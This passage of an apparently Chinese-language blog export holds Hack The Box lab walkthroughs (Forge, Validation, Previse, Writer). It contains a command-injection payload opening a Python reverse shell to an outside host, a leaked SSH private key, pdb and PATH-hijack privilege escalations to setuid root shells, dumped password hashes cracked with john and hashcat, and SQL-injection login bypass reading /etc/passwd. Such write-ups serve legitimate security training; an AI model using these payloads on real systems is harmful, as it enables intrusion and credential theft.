xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0 2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98 yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+ kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/ wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM 0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC 9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE= -----END OPENSSH PRIVATE KEY----- 成功拿到私钥，保存到本地后使用私钥进行登录 ┌──(root💀kali)-[~/Desktop] └─# chmod 600 id_rsa 1 ⚙ ┌──(root💀kali)-[~/Desktop] └─# ssh user@10.10.11.111 -i id_rsa 1 ⚙ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 27 Sep 2021 03:26:19 AM UTC System load: 0.0 Processes: 220 Usage of /: 45.0% of 6.82GB Users logged in: 0 Memory usage: 30% IPv4 address for eth0: 10.10.11.111 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Sep 26 21:31:23 2021 from 10.10.14.120 -bash-5.0$ whoami&amp;&amp;id user uid=1000(user) gid=1000(user) groups=1000(user) 登入成功 -bash-5.0$ ls snap user.txt -bash-5.0$ cat user.txt 7e72b4a44d946d578baa60ad23b0482f 成功拿到user权限的flag文件 权限提升首先查看一下sudo -l -bash-5.0$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py 这里的意思是/usr/bin/python3可以使用root权限执行/opt/remote-manage.py脚本 咱们去看一下这个脚本 -bash-5.0$ cat /opt/remote-manage.py #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((&#39;127.0.0.1&#39;, port)) sock.listen(1) print(f&#39;Listening on localhost:{port}&#39;) (clientsock, addr) = sock.accept() clientsock.send(b&#39;Enter the secret passsword: &#39;) if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;: clientsock.send(b&#39;Wrong password!\\n&#39;) else: clientsock.send(b&#39;Welcome admin!\\n&#39;) while True: clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;) clientsock.send(b&#39;[1] View processes\\n&#39;) clientsock.send(b&#39;[2] View free memory\\n&#39;) clientsock.send(b&#39;[3] View listening sockets\\n&#39;) clientsock.send(b&#39;[4] Quit\\n&#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(&#39;df&#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode()) elif option == 4: clientsock.send(b&#39;Bye\\n&#39;) break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit() 这个脚本的意思是运行脚本后会开启一个端口，连接着一个端口输入选项，异常状态时会进入pdb，从而导致执行任意python代码 那么原理有了，说干就干 那么我们需要打开两个窗口，一个用于执行脚本，一个用于连接端口 Server-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:34260 Client-bash-5.0$ nc localhost 34260 Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit &#39; 密码在脚本中，登录后输入一个顿号即可报错 提权后操作-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:34260 invalid literal for int() with base 10: b&quot;&#39;&quot; &gt; /opt/remote-manage.py(27)&lt;module&gt;() -&gt; option = int(clientsock.recv(1024).strip()) (Pdb) import os (Pdb) os.system(&quot;ls /root&quot;) clean-uploads.sh root.txt snap 0 (Pdb) os.system(&quot;chmod +s /bin/bash&quot;) 0 (Pdb) exit() -bash-5.0$ ls -la /bin/bash -rwsr-sr-x 1 root root 1183448 Jun 18 2020 /bin/bash -bash-5.0$ /bin/bash -p bash-5.0# whomai&amp;&amp;id bash: whomai: command not found bash-5.0# whoami&amp;&amp;id root uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user) bash-5.0# cd /root bash-5.0# ls clean-uploads.sh root.txt snap bash-5.0# cat root.txt 67a501971344b12bade28d6a75e98cbd 报错后，使用python导入os.system模块，然后即可执行system权限 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Validation - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Validation","date":"2021-09-27T11:38:36.000Z","updated":"2023-06-13T03:54:51.000Z","comments":true,"path":"2021/09/27/Hackthebox/Easy/Hackthebox-Validation/","link":"","permalink":"http://www.lucifiel.com/2021/09/27/Hackthebox/Easy/Hackthebox-Validation/","excerpt":"","text":"Hackthebox - Validation靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV 10.10.11.116 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 04:02 EDT Nmap scan report for 10.10.11.116 Host is up (0.35s latency). Not shown: 992 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 8080/tcp open http nginx |_http-title: 502 Bad Gateway No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=9/23%OT=22%CT=1%CU=39467%PV=Y%DS=2%DC=T%G=Y%TM=614C34A OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 364.74 ms 10.10.14.1 2 364.80 ms 10.10.11.116 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.02 seconds","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Previse - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Previse","date":"2021-08-09T11:38:36.000Z","updated":"2023-06-13T03:49:17.000Z","comments":true,"path":"2021/08/09/Hackthebox/Easy/Hackthebox-Previse/","link":"","permalink":"http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/","excerpt":"","text":"Hackthebox - Previse靶场信息 靶场类型 信息搜集使用nmap进行端口扫描 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.104 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:27 CST Nmap scan report for 10.10.11.104 Host is up (0.25s latency). Not shown: 65461 closed ports, 72 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=8/8%OT=22%CT=1%CU=38368%PV=Y%DS=2%DC=T%G=Y%TM=610FF0E8 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 249.39 ms 10.10.14.1 2 249.51 ms 10.10.11.104 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1810.62 seconds 咱们进80端口看一下HTTP服务的内容 这是一个文件管理服务器，我测试了一下简单的弱口令无果，咱们先fuzz一下吧 ┌──(root💀root)-[~/Desktop] └─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -e php,html,txt -mc 200,302,301 -u http://10.10.11.104/FUZZ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.104/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt :: Extensions : php html txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,302,301 ________________________________________________ login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] index.php [Status: 302, Size: 2801, Words: 737, Lines: 72] index.html [Status: 200, Size: 663, Words: 24, Lines: 23] download.php [Status: 302, Size: 0, Words: 1, Lines: 1] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] footer.php [Status: 200, Size: 217, Words: 10, Lines: 6] header.php [Status: 200, Size: 980, Words: 183, Lines: 21] favicon.ico [Status: 200, Size: 15406, Words: 15, Lines: 10] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] . [Status: 302, Size: 2801, Words: 737, Lines: 72] status.php [Status: 302, Size: 2968, Words: 749, Lines: 75] nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32] index.html [Status: 200, Size: 663, Words: 24, Lines: 23] index.php [Status: 302, Size: 2801, Words: 737, Lines: 72] accounts.php [Status: 302, Size: 3994, Words: 1096, Lines: 94] files.php [Status: 302, Size: 4914, Words: 1531, Lines: 113] login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] files.php [Status: 302, Size: 4914, Words: 1531, Lines: 113] :: Progress: [148168/148168] :: Job [1/1] :: 391 req/sec :: Duration: [0:06:55] :: Errors: 4 :: 直接访问了部分页面，都会跳转到index.php页面，使用curl访问试试 curl http://10.10.11.104/files.php &lt;td&gt;&lt;a href=&#39;download.php?file=32&#39;&gt;&lt;button class=&quot;uk-button uk-button-text&quot;&gt;siteBackup.zip&lt;/button&gt;&lt;/a&gt;&lt;/td&gt; 这样看来，我们可以通过一些特殊的技巧来访问部分页面 访问 /accounts.php 会跳转到 /index.php ，这里我们使用burp抓包 抓包后点击 Do interrcept &gt; Response to this request 来进行更改状态码 将框选起来的部分修改为 HTTP/1.1 200 然后放包 成功进入添加新用户的页面 添加一个新用户 创建好以后，会自动跳转到 index.php 页面，然后去登录 登入后在 FILES 页面下有一个上传点和一个文件 SITEBACKUP.ZIP ，先下载下来看看 ### config.php &lt;?php function connectDB(){ $host = &#39;localhost&#39;; $user = &#39;root&#39;; $passwd = &#39;mySQL_p@ssw0rd!:)&#39;; $db = &#39;previse&#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?&gt; 得到了mysql的账号密码 ### logs.php &lt;?php session_start(); if (!isset($_SESSION[&#39;user&#39;])) { header(&#39;Location: login.php&#39;); exit; } ?&gt; &lt;?php if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) { header(&#39;Location: login.php&#39;); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&quot;); echo $output; $filepath = &quot;/var/www/out.log&quot;; $filename = &quot;out.log&quot;; if(file_exists($filepath)) { header(&#39;Content-Description: File Transfer&#39;); header(&#39;Content-Type: application/octet-stream&#39;); header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.basename($filepath).&#39;&quot;&#39;); header(&#39;Expires: 0&#39;); header(&#39;Cache-Control: must-revalidate&#39;); header(&#39;Pragma: public&#39;); header(&#39;Content-Length: &#39; . filesize($filepath)); ob_clean(); // Discard data in the output buffer flush(); // Flush system headers readfile($filepath); die(); } else { http_response_code(404); die(); } ?&gt; 从上述代码审计发现，这台靶机的程序使用了python进行编写，而不是PHP，从代码看起来，这很容易被命令注入 ## 漏洞利用 点击 MANAGEMENT MENU &gt; LOG DATA &gt; SUBMIT使用burp抓包 delim=comma;python3+-c+&#39;import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect((&quot;10.10.14.110&quot;,4444)) %3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39; 使用nc监听端口，即可getshell (root💀root)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.104] 56380 bash-4.4$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 登录mysql bash-4.4$ mysql -u root -p mysql -u root -p Enter password: mySQL_p@ssw0rd!:) show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ use previse; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ select * from accounts; +----+-----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+-----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | robin | $1$🧂llol$gBt8as2nJZA5K1YqzaH9Z/ | 2021-08-08 12:38:45 | | 4 | caratortu | $1$🧂llol$04L/OghOADV.ufho3gKfY. | 2021-08-08 13:23:42 | | 5 | bobby | $1$🧂llol$SyqVySL69GZ.tBbiicFiT/ | 2021-08-08 14:02:50 | | 6 | lucifiel | $1$🧂llol$K9wrU9maYCFrqr482bGkS/ | 2021-08-08 17:49:18 | | 7 | 0xrf1606 | $1$🧂llol$rObjMowMWOzqMlAz8ZsBc1 | 2021-08-08 18:02:45 | +----+-----------+------------------------------------+---------------------+ 通过查看home目录，发现m4lwhere这个用户是我们需要的用户(其他用户都是其他正在做这台靶机的人创建的，基于HTB的规则，咱们不要影响到其他人)，咱们把它的hash拿去使用hashcat或者john破解 ### john ┌──(root💀root)-[~/Desktop] └─# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status ilovecody112235! (?) 1g 0:00:20:20 DONE (2021-08-09 02:51) 0.000819g/s 6073p/s 6073c/s 6073C/s ilovecody31..ilovecody.. Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed ┌──(root💀root)-[~/Desktop] └─# john --show hash ?:ilovecody112235! 1 password hash cracked, 0 left hashcat┌──(root💀root)-[~/Desktop] └─# hashcat -a 0 -m 500 hash --wordlist /usr/share/wordlists/rockyou.txt -o 123 255 ⨯ hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 2868/2932 MB (1024 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 64 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 ┌──(root💀root)-[~/Desktop] └─# cat 123 $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! 得到了账号密码 username = m4lwhere password = ilovecody112235! 使用ssh进行登录 ┌──(root💀root)-[~/Desktop] └─# ssh m4lwhere@10.10.11.104 m4lwhere@10.10.11.104&#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Aug 8 19:21:55 UTC 2021 System load: 0.4 Processes: 202 Usage of /: 49.2% of 4.85GB Users logged in: 0 Memory usage: 20% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5 m4lwhere@previse:~$ whoami&amp;&amp;id m4lwhere uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere) m4lwhere@previse:~$ cat user.txt 29e7b0a44a1b8cc46856e3b43ccdcfa4 成功获得user权限的flag ## 权限提升 使用sudo -l查看一下m4lwhere用户的sudo权限 m4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh 查看一下这个文件 m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz 提权 cd /tmp cat &lt;&lt; EOF &gt; gzip &gt; #!/bin/bash &gt; cp /bin/bash /tmp/c &gt; chmod u+s /tmp/c &gt; EOF chmod +x gzip export PATH=$( pwd ):$PATH sudo /opt/scripts/access_backup.sh ./c -p c-4.4# whoami&amp;&amp;id root uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere) 成功提权到root权限 c-4.4# cd /root c-4.4# ls root.txt c-4.4# cat root.txt 76a5854ac1f5d8cb5e1079cb1964dacf 成功拿到root权限的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Writer - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Writer","date":"2021-08-06T11:38:36.000Z","updated":"2023-06-13T03:55:02.000Z","comments":true,"path":"2021/08/06/Hackthebox/Medium/Hackthebox-Writer/","link":"","permalink":"http://www.lucifiel.com/2021/08/06/Hackthebox/Medium/Hackthebox-Writer/","excerpt":"","text":"Hackthebox-Writer靶场信息 靶场类型 信息搜集使用nmap进行信息搜集 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.101 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 03:27 CST Nmap scan report for 10.10.11.101 Host is up (0.23s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=8/5%OT=22%CT=1%CU=34682%PV=Y%DS=2%DC=T%G=Y%TM=610AEB60 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 12m51s |_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-08-04T19:45:33 |_ start_date: N/A TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 259.68 ms 10.10.14.1 2 259.76 ms 10.10.11.101 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 298.54 seconds 咱们去80端口的HTTP服务看一下 在人工查看以后，我发现并没有什么突破，咱们先做个目录fuzz吧 ┌──(root💀root)-[~/Desktop] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.101/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/08/05 04:22:00 Starting gobuster in directory enumeration mode =============================================================== http://10.10.11.101/about (Status: 200) [Size: 3522] http://10.10.11.101/contact (Status: 200) [Size: 4905] http://10.10.11.101/static (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/] http://10.10.11.101/logout (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/] http://10.10.11.101/dashboard (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/] http://10.10.11.101/administrative (Status: 200) [Size: 1443] http://10.10.11.101/server-status (Status: 403) [Size: 277] =============================================================== 2021/08/05 04:32:00 Finished =============================================================== 发现有一个 administratortive 目录，咱们进入查看一下 是一个登录页面，我测试了一下弱口令，并不存在 然后经过我大量的测试以后，发现这个登录页面存在Sql注入，且可用万能密码进行登录 ## 漏洞利用 咱们对比一下这两个的区别，可以发现 admin&#39;order by 6;--+ 是执行成功了，提示咱们 Welecome admin ，所以确定存在注入 通过进行细致的手工注入后发现，该注入点第二项可被显示咱们利用这个点来进行利用 经过大量的测试后，发现该注入点可用来读取文件 /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 